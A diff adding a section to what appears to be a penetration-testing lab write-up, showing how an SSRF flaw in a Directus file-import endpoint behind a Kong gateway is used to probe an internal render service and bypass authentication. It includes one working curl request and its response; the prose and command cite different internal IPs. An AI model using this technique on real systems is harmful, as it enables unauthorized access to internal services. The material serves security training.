@@ -432,3 +432,24 @@ The default port for Directus is `8055`, which aligns with host four. Port `5432
 
 We still have one host running an unknown HTTP service on port `9000`. However, the SSRF vulnerability allows us to verify which backend servers are hosting the public endpoints we have identified.
 ## Render API Auth Bypass
+We identified the `/render` service during enumeration, but it requires authentication via an API gateway. To bypass this, we can attempt SSRF to access the service directly. Since it's likely not hosted on the Directus server, we'll test the unknown service on port `9000` using SSRF to check if `http://172.16.16.3:9000/render` is valid.
+
+```bash
+kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/render"}' http://apigateway:8000/files/import
+HTTP/1.1 500 Internal Server Error
+Content-Type: application/json; charset=utf-8
+Content-Length: 108
+Connection: keep-alive
+X-Powered-By: Directus
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Access-Control-Expose-Headers: Content-Range
+ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
+Date: Thu, 25 Feb 2021 16:59:49 GMT
+X-Kong-Upstream-Latency: 33
+X-Kong-Proxy-Latency: 1
+Via: kong/2.2.1
+
+{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+```
+Our request failed to locate a valid resource, likely because the backend URL differs from the one exposed by the API gateway—possibly due to versioning. We'll try fuzzing and analyzing response codes to identify the correct backend path.
